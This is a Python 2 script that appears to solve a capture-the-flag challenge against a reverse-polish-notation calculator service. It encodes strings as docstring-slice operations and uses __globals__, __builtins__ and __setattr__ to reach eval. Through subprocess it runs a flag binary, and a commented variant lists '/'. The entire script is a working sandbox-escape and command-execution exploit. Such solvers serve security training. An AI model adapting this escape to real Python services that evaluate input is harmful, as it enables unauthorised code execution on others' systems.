#!/usr/bin/env python
# -*- coding: utf-8 -*-
DOCSTRING="""
+-------------------------------------------------------------------------+
| This is a calculator that takes expressions in reverse polish notation. |
|                                                                         |
| In reverse polish notation the operands precede the operators. Unlike   |
| conventional infix notation every statement is unambiguous so no        |
| parenthesis are required.                                               |
|                                                                         |
| Here are some examples of how to use it:                                |
| 1 1 add             -> (1 + 1)                                          |
| 1 1 add 5 multiply  -> (1 + 1) * 5                                      |
|                                                                         |
| Here are the operators available to you.                                |
| add      - addition                                                     |
| subtract - subtraction                                                  |
| multiply - multiplication                                               |
| divide   - standard division                                            |
| idivide  - integer division                                             |
| power    - exponentiation                                               |
| xor      - standard exclusive-or function                               |
| wumbo    - standard wumbo function                                      |
|                                                                         |
| the quick brown fox jumps over the lazy dog                             |
| THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG                             |
| 1234567890~!@#$%^&*()_+-=[]{}\|:;"'?/>.<,     ¯\_(ツ)_/¯                |
+_________________________________________________________________________+
"""
STRING_TEMPLATE = lambda x, y: '{} {} __doc__.__getslice__ '.format(x, y)


def main():
    # python_code = "__import__('subprocess').check_output(['ls', '/'])"
    python_code = "__import__('subprocess').check_output(['/hooraay_run_me_to_get_your_flag'])"
    eval_attribute = '_z' # The attribute of the class that will be assigned to 'eval', so we can call eval
    print make_string(python_code) +\
        make_string(eval_attribute) +\
        make_string('__builtins__') +\
        '1 evaluate.__globals__.get ' +\
        make_string('eval') +\
        '__class__.__getattribute__ __setattr__ ' +\
        eval_attribute


def make_string(desired_string, template_string=DOCSTRING):
    # Do this the laziest way possible
    final = ''
    for c in desired_string:
        cindex = template_string.index(c)
        final += (STRING_TEMPLATE(cindex, cindex+1))
    final += "add " * (len(desired_string) - 1)
    return final


if __name__ == '__main__':
    main()
